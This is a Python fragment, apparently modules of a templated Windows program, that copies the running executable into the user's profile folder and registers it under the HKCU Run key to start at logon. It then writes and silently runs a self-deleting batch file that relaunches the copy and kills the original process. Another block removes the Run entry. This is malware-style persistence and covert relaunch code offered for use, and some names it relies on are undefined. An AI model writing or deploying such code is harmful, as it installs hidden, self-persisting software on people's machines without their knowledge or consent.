from shutil import copy2, rmtree
import winreg
import sys
import os
# end of imports

# !registry_implosion
registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
winreg.DeleteValue(registry_key, software_registry_name)

# !registry
if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_name.lower() + '\\' + software_executable_name.lower() and not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name):
    try: os.mkdir('C:\\Users\\' + getuser() + '\\' + software_directory_name)
    except: pass
    copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    winreg.CloseKey(registry_key)
    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        activator.write(f'pushd "C:\\Users\\{getuser()}\\{software_directory_name}"\nstart "" "{software_executable_name}"\ntaskkill /f /im "{process_name}"\ndel "%~f0"')
    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit(0)
